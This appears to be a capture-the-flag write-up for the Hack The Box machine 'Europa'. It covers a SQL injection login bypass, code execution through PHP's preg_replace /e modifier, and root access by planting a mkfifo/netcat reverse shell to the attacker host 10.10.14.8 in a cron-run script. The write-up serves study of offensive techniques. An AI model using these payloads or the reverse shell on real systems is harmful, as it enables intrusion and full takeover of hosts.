nmap scan

```
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

### Enumerating port 80

There's the apache default page:

![image1](/assets/images/htb-europa/europa1.png)

### Enumerating port 443

I get the message *Warning: Potential Security Risk Ahead* and I check the certificate:

![image2](/assets/images/htb-europa/europa2.png)

There are 3 new vhosts, after continuing there's also a apache default page.

### Enumerating the vhosts

`europacorp.htb` and `www.europacorp.htb` are apache default page too, but `admin-portal.europacorp.htb` has a login:

![image3](/assets/images/htb-europa/europa3.png)

We can try sql injection.

### Exploiting SQL Injection on the login

I tried using `'-- -` on the password field but didn't succed, after, I tryed on the email and with a `'` I got a SQL error, then I used the `'-- -` and I can log in:

![image4](/assets/images/htb-europa/europa4.png)

And click on `Follow redirection`:

![image5](/assets/images/htb-europa/europa5.png)

### Enumerating admin dashboard

![image6](/assets/images/htb-europa/europa6.png)

On tools there's a openvpn config generator, I'll intercept the request when I generate a new configuration:

![image7](/assets/images/htb-europa/europa7.png)

So the `%22` are `/` that are used for regex, that will replace the `ip_address` with the value (if `ip_address=10.10.10.10`, everytime in the code there's `ip_address` it will be replaced by 10.10.10.10).

### Exploting the preg_replace vulnerability to get a reverse shell

There's a vulnerability with `preg_replace` that we can put code and it will be executed, what you have to do is add an `e` after the regex and then in the value replaced put php code:

![image8](/assets/images/htb-europa/europa8.png)

Now we can get a reverse shell:

![image9](/assets/images/htb-europa/europa9.png)

Set up a listener and you'll get the connection back.

### Privilege escalation

Viewing crontab there's a php script executed by root:

![image10](/assets/images/htb-europa/europa10.png)

It is executing some php code that executes another file: `/var/www/cmd/logcleared.sh`, this file doens't exisists so I'll will create it and put a reverse shell:

```bash
#!/bin/bash

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 9008 >/tmp/f
```

And give perms:

```bash
chmod 777 /var/www/cmd/logcleared.sh
```

It is running by root, so I'll get the reverse shell as root:

```bash
nc -lvnp 9008                                                                 
listening on [any] 9008 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.22] 43884
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
```
